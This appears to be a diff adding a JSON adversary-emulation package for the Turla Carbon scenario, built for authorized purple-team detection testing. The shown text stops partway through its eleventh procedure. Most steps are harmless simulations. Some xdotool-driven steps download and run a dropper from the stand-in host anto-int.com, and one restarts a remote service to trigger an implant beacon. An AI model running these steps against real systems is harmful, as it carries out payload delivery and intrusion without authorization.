@@ -1,0 +1,2963 @@
+{
+  "package_id": "ctid-turla-carbon-v1",
+  "package_name": "CTID - Turla - Carbon Full Emulation",
+  "version": "1.0.0",
+  "description": "Threat-informed Turla - Carbon full emulation based on 45 ordered CTID procedures. Use it to assess cross-tactic detection and response across a documented multi-stage intrusion; 9 procedure variants use source commands and 36 use executable Morgana-native simulations.",
+  "summary": "Threat-informed emulation of documented Turla - Carbon behavior and attack progression.",
+  "purpose": "Validate defensive performance across a multi-stage Turla - Carbon scenario rather than isolated techniques.",
+  "capabilities": [
+    "Preserves 45 CTID procedures in source order across 11 tactics.",
+    "Creates operational Morgana Attack Chains using source commands and labeled telemetry simulations.",
+    "Retains CTI references, procedure steps, source requirements, ATT&CK mappings, and conversion limitations."
+  ],
+  "use_cases": [
+    "Run a threat-informed Purple Team assessment modeled on documented Turla - Carbon behaviors.",
+    "Evaluate cross-stage prevention, telemetry, detection, investigation, and response handoffs.",
+    "Customize a source-faithful baseline Chain for an authorized environment while retaining provenance."
+  ],
+  "safety_notes": [
+    "Review every source command, simulation, required Tag, and cleanup action before execution.",
+    "Payload-dependent and external C2 procedures use sandboxed or loopback Morgana simulations until exact dependencies are packaged.",
+    "Threat-informed adversary emulation content is for explicitly authorized security validation and defensive testing only."
+  ],
+  "author": "MITRE CTID / X3M.AI conversion",
+  "created": "2026-08-28",
+  "script_prefix": "CTID - ",
+  "provider": "mitre-ctid",
+  "source": "ctid-adversary-emulation-library",
+  "source_repository": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library",
+  "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+  "source_license": "Apache-2.0",
+  "reference_converter": {
+    "name": "MITRE Emu",
+    "repository": "https://github.com/mitre/emu",
+    "commit": "ef3bc4fa8fb605c774446ba7741365ba45d375a8"
+  },
+  "documentation_url": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/turla",
+  "mitre_domain": "enterprise-attack",
+  "attack_version": "13",
+  "mitre_tactic": "Multiple",
+  "mitre_tcodes": [
+    "T1003",
+    "T1018",
+    "T1021.004",
+    "T1033",
+    "T1053.005",
+    "T1059.001",
+    "T1069.002",
+    "T1070.004",
+    "T1105",
+    "T1110.003",
+    "T1112",
+    "T1189",
+    "T1204.002",
+    "T1205",
+    "T1550.002",
+    "T1566.002",
+    "T1570",
+    "T1574.011"
+  ],
+  "platform": [
+    "linux"
+  ],
+  "plan_type": "full-emulation",
+  "adversary": "Turla - Carbon",
+  "intelligence_summary": "Turla is a Russian-based threat group known for watering hole and spear phishing campaigns and leveraging in-house tools and malware.",
+  "scenario_count": 1,
+  "scenario_names": [
+    "Canonical Emulation Flow"
+  ],
+  "chain_names": [
+    "CTID - Turla - Carbon - Canonical Emulation Flow"
+  ],
+  "complexity": "advanced",
+  "source_procedure_count": 45,
+  "converted_procedure_count": 45,
+  "manual_procedure_count": 0,
+  "simulated_procedure_count": 36,
+  "skipped_procedure_count": 0,
+  "prerequisites": [
+    "Morgana Agent installed on each explicitly authorized execution host",
+    "Plan Tags configured for the lab; credential and target defaults are intentionally blank",
+    "Operator review of every source command, simulation, and external dependency before Chain execution"
+  ],
+  "tag_categories": [
+    {
+      "category_id": "ctid_turla_carbon_inputs",
+      "label": "Turla - Carbon Scenario Inputs",
+      "description": "Plan-wide CTID facts required by automated procedure variants.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "T1204.002",
+        "T1205",
+        "X"
+      ],
+      "tags": [
+        {
+          "key": "ctid_turla_carbon_first_target_user",
+          "label": "First Target User",
+          "description": "The username of the first target host.",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true,
+          "parameter_class": "connection",
+          "source_default_class": "network-target"
+        },
+        {
+          "key": "ctid_turla_carbon_second_target_user",
+          "label": "Second Target User",
+          "description": "The username of the second target host.",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true,
+          "parameter_class": "connection",
+          "source_default_class": "network-target"
+        },
+        {
+          "key": "ctid_turla_carbon_first_target_host",
+          "label": "First Target Host",
+          "description": "The hostname of the first target host.",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true,
+          "parameter_class": "connection",
+          "source_default_class": "network-target"
+        },
+        {
+          "key": "ctid_turla_carbon_third_target_user",
+          "label": "Third Target User",
+          "description": "The username of the third target host.",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true,
+          "parameter_class": "connection",
+          "source_default_class": "network-target"
+        },
+        {
+          "key": "ctid_turla_carbon_apache_server_ip",
+          "label": "Apache Server Ip",
+          "description": "The IP address of the Apache server.",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true,
+          "parameter_class": "connection",
+          "source_default_class": "network-target"
+        },
+        {
+          "key": "ctid_turla_carbon_attacker_host_ip",
+          "label": "Attacker Host Ip",
+          "description": "The ip address of the attacker's host.",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true,
+          "parameter_class": "connection",
+          "source_default_class": "network-target"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "CTID - Turla - Carbon - X - RDP to 1st host (User)",
+      "name": "CTID - Turla - Carbon - X - RDP to 1st host (User)",
+      "description": "Use xfreerdp to RDP into the first host. Then, wait for the login to complete. Morgana-native operational simulation used because: unsupported source executor: proc; source command depends on CALDERA, external C2, or implant primitives.",
+      "tactic": "x",
+      "tcode": "X",
+      "technique_name": "x",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation X'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; (timeout 1 sh -c 'echo CTID > /dev/tcp/127.0.0.1/22' 2>/dev/null || true); echo 'loopback remote-service probe completed'; echo '[SUCCESS] CTID simulation X family=lateral'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "9a49d734-c69a-4a6b-b726-5a2a86edf418",
+        "source_order": 1,
+        "procedure_step": "x",
+        "procedure_group": "x",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "simulation_family": "lateral",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1566.002 - Download EPIC dropper (User)",
+      "name": "CTID - Turla - Carbon - T1566.002 - Download EPIC dropper (User)",
+      "description": "Using xdotool, send keystrokes to download the EPIC dropper.",
+      "tactic": "Initial Access",
+      "tcode": "T1566.002",
+      "technique_name": "Phishing: Spearphishing Link",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "rdp_pid=$(pgrep -f xfreerdp);\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nxdotool mousemove --window \"$rdp_window\" 100 100 click 1;\nxdotool key --window \"$rdp_window\" Ctrl+Escape;\nsleep 6;\nxdotool type --window \"$rdp_window\" \"run\";\nsleep 6;\nxdotool key --window \"$rdp_window\" Return;\nsleep 6;\nxdotool type --window \"$rdp_window\" \"microsoft-edge\";\nxdotool key --window \"$rdp_window\" shift+colon; \nxdotool type --window \"$rdp_window\" \"http\";\nxdotool key --window \"$rdp_window\" shift+colon; \nxdotool type --window \"$rdp_window\" \"//anto-int.com/\";\nxdotool key --window \"$rdp_window\" shift+N; \nxdotool key --window \"$rdp_window\" shift+T; \nxdotool key --window \"$rdp_window\" shift+F; \nxdotool key --window \"$rdp_window\" shift+V; \nxdotool type --window \"$rdp_window\" \"ersion.exe\";\nxdotool key --window \"$rdp_window\" Return;\nsleep 20;\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\n\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\n\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\n\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\n\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\nxdotool key --window \"$rdp_window\" Tab; sleep 1;\nxdotool key --window \"$rdp_window\" Return;",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "2c7ad0e1-d112-4c71-8deb-38bc3ce5654b",
+        "source_order": 2,
+        "procedure_step": "1.A.1",
+        "procedure_group": "procedure_initial_access",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1204.002 - Run EPIC dropper (User)",
+      "name": "CTID - Turla - Carbon - T1204.002 - Run EPIC dropper (User)",
+      "description": "Using xdotool, run the EPIC droppper.",
+      "tactic": "Execution",
+      "tcode": "T1204.002",
+      "technique_name": "User Execution: Malicious File",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "ctid_turla_carbon_first_target_user"
+      ],
+      "required_assets": [],
+      "command": "rdp_pid=$(pgrep -f xfreerdp);\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nxdotool mousemove --window \"$rdp_window\" 100 100 click 1;\nxdotool key --window \"$rdp_window\" Ctrl+Escape;\nsleep 6;\nxdotool type --window \"$rdp_window\" \"run\";\nsleep 6;\nxdotool key --window \"$rdp_window\" Return;\nsleep 6;\nxdotool type --window \"$rdp_window\" 'C';\nxdotool key --window \"$rdp_window\" shift+colon;           \nxdotool type --window \"$rdp_window\" '\\Users\\#{ctid_turla_carbon_first_target_user}\\Downloads\\';\nxdotool key --window \"$rdp_window\" shift+N; \nxdotool key --window \"$rdp_window\" shift+T; \nxdotool key --window \"$rdp_window\" shift+F; \nxdotool key --window \"$rdp_window\" shift+V; \nxdotool type --window \"$rdp_window\" \"ersion\";\nsleep 6;\nxdotool key --window \"$rdp_window\" Return;\nsleep 6;\nxdotool key --window \"$rdp_window\" R;\nsleep 30;",
+      "cleanup_command": null,
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "bb4dd7c0-c5df-4321-94ca-cb7da59b9c32",
+        "source_order": 3,
+        "procedure_step": "1.A.2",
+        "procedure_group": "procedure_execution",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - X - Log out of the 1st target host (User)",
+      "name": "CTID - Turla - Carbon - X - Log out of the 1st target host (User)",
+      "description": "Use xdotool to send keystrokes to log out of the 1st target host.",
+      "tactic": "x",
+      "tcode": "X",
+      "technique_name": "x",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "rdp_pid=$(pgrep -f xfreerdp);\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\necho $rdp_window;\nsleep 5; \nxdotool mousemove --window \"$rdp_window\" 100 100 click 1;\nxdotool key --window \"$rdp_window\" Ctrl+Alt+Delete;\nsleep 6;\nxdotool key --window \"$rdp_window\" Down;\nsleep 6;\nxdotool key --window \"$rdp_window\" Return;\nsleep 30;",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "c4e2f189-ef8d-4073-abfb-1d3449af464b",
+        "source_order": 4,
+        "procedure_step": "x",
+        "procedure_group": "x",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - X - Log back in to the 1st target host (User)",
+      "name": "CTID - Turla - Carbon - X - Log back in to the 1st target host (User)",
+      "description": "Use xfreerdp to log back in to the 1st target host. Wait for login to complete. Morgana-native operational simulation used because: unsupported source executor: proc; source command depends on CALDERA, external C2, or implant primitives.",
+      "tactic": "x",
+      "tcode": "X",
+      "technique_name": "x",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation X'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf 'host=%s user=%s kernel=%s\\n' \"$(hostname)\" \"$(id -un)\" \"$(uname -sr)\" | tee \"$simulation_root/readiness.txt\"; echo '[SUCCESS] CTID simulation X family=readiness'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "771a00b3-2b39-436d-b003-b58cacffa774",
+        "source_order": 5,
+        "procedure_step": "x",
+        "procedure_group": "x",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "simulation_family": "readiness",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - X - Open Edge to trigger 1st EPIC beacon (User)",
+      "name": "CTID - Turla - Carbon - X - Open Edge to trigger 1st EPIC beacon (User)",
+      "description": "Use xdotool to open Microsoft Edge and open a blank page. Then, wait to receive the new implant beacon.",
+      "tactic": "x",
+      "tcode": "X",
+      "technique_name": "x",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "rdp_pid=$(pgrep -f xfreerdp);\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\necho $rdp_window;\nsleep 5; \nxdotool mousemove --window \"$rdp_window\" 100 100 click 1;\nxdotool key --window \"$rdp_window\" Ctrl+Escape;\nsleep 6;\nxdotool type --window \"$rdp_window\" \"run\";\nsleep 6;\nxdotool key --window \"$rdp_window\" Return;\nsleep 6;\nxdotool type --window \"$rdp_window\" \"microsoft-edge\";\nxdotool key --window \"$rdp_window\" shift+colon;\nxdotool key --window \"$rdp_window\" Return;\nsleep 180;",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "3e20bbc1-b60a-4129-88b5-627b7b4ac17d",
+        "source_order": 6,
+        "procedure_step": "x",
+        "procedure_group": "x",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1069.002 - Execute net group discovery commands and execute `tasklist /svc` (Adversary)",
+      "name": "CTID - Turla - Carbon - T1069.002 - Execute net group discovery commands and execute `tasklist /svc` (Adversary)",
+      "description": "Execute net group discovery commands and execute `tasklist /svc` Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Discovery",
+      "tcode": "T1069.002",
+      "technique_name": "Permission Groups Discovery: Domain Groups",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1069.002'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; uname -a; id; ps -eo pid,ppid,user,comm | head -n 12; (ip addr 2>/dev/null || ifconfig 2>/dev/null || true); echo '[SUCCESS] CTID simulation T1069.002 family=discovery'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "eb66d327-3f82-4433-8897-76cd8a46865b",
+        "source_order": 7,
+        "procedure_step": "3.A.1-2",
+        "procedure_group": "procedure_discovery",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "discovery",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "first.epic.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "first.epic.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1059.001 - Reg query the ViperVPNSvc Service & verify which users can access it (Adversary)",
+      "name": "CTID - Turla - Carbon - T1059.001 - Reg query the ViperVPNSvc Service & verify which users can access it (Adversary)",
+      "description": "Reg query the ViperVPNSvc Service & verify which users can access it Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Execution",
+      "tcode": "T1059.001",
+      "technique_name": "Command and Scripting Interpreter: Powershell",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1059.001'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf '@reboot /bin/true # Morgana CTID simulation\\n' > \"$simulation_root/ctid-crontab\"; cat \"$simulation_root/ctid-crontab\"; echo '[SUCCESS] CTID simulation T1059.001 family=persistence'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "88bb16c5-f78b-45c3-91b6-a7422cd2fb13",
+        "source_order": 8,
+        "procedure_step": "3.A.5-6",
+        "procedure_group": "procedure_execution",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "persistence",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "first.epic.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "first.epic.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1574.011 - Modify the ViperVPN service registry key (Adversary)",
+      "name": "CTID - Turla - Carbon - T1574.011 - Modify the ViperVPN service registry key (Adversary)",
+      "description": "Modify the ViperVPN service registry key Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1574.011",
+      "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1574.011'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf '@reboot /bin/true # Morgana CTID simulation\\n' > \"$simulation_root/ctid-crontab\"; cat \"$simulation_root/ctid-crontab\"; echo '[SUCCESS] CTID simulation T1574.011 family=persistence'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "d5e29782-72ca-45f0-b286-09525ae91d75",
+        "source_order": 9,
+        "procedure_step": "3.A.7",
+        "procedure_group": "procedure_privilege_escalation",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "persistence",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "first.epic.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "first.epic.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - X - RDP to 2nd host (User)",
+      "name": "CTID - Turla - Carbon - X - RDP to 2nd host (User)",
+      "description": "Use xfreerdp to RDP into the second host. Then, wait for the login to complete. Morgana-native operational simulation used because: unsupported source executor: proc; source command depends on CALDERA, external C2, or implant primitives.",
+      "tactic": "x",
+      "tcode": "X",
+      "technique_name": "x",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation X'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; (timeout 1 sh -c 'echo CTID > /dev/tcp/127.0.0.1/22' 2>/dev/null || true); echo 'loopback remote-service probe completed'; echo '[SUCCESS] CTID simulation X family=lateral'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "349d3879-c849-493a-989e-6d7f40015f54",
+        "source_order": 10,
+        "procedure_step": "x",
+        "procedure_group": "x",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "simulation_family": "lateral",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - X - Stop and start ViperVPNSvc Service (User)",
+      "name": "CTID - Turla - Carbon - X - Stop and start ViperVPNSvc Service (User)",
+      "description": "Use xdotool to open an administrator powershell prompt on the second host. Use the administrator powershell prompt to start the ViperVPNSvc Service on the second host. Then, wait for the implant beacon.",
+      "tactic": "x",
+      "tcode": "X",
+      "technique_name": "x",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "ctid_turla_carbon_second_target_user",
+        "ctid_turla_carbon_first_target_host"
+      ],
+      "required_assets": [],
+      "command": "rdp_pid=$(pgrep -f #{ctid_turla_carbon_second_target_user});\nrdp_window=$(xdotool search --pid \"$rdp_pid\"); \n\nxdotool mousemove --window \"$rdp_window\" 100 100 click 1;\nxdotool key --window \"$rdp_window\" Ctrl+Escape;\nsleep 1;\nxdotool type --window \"$rdp_window\" \"powershell\";\nsleep 1;\nxdotool key --window \"$rdp_window\" Shift+F10;\nsleep 1;\nxdotool key --window \"$rdp_window\" Down;\nsleep 1;\nxdotool key --window \"$rdp_window\" Return;\nsleep 1;\nxdotool key --window \"$rdp_window\" alt+Y;  \nsleep 2;\nxdotool type --window \"$rdp_window\" \"sc.exe \\\\\\\\#{ctid_turla_carbon_first_target_host} stop ViperVPNSvc; sc.exe \\\\\\\\#{ctid_turla_carbon_first_target_host} start ViperVPNSvc;\";\nsleep 2;\nxdotool key --window \"$rdp_window\" Return;\nsleep 250;",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "b7190a39-c5f1-4955-8923-44807d8069e7",
+        "source_order": 11,
+        "procedure_step": "x",
+        "procedure_group": "x",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
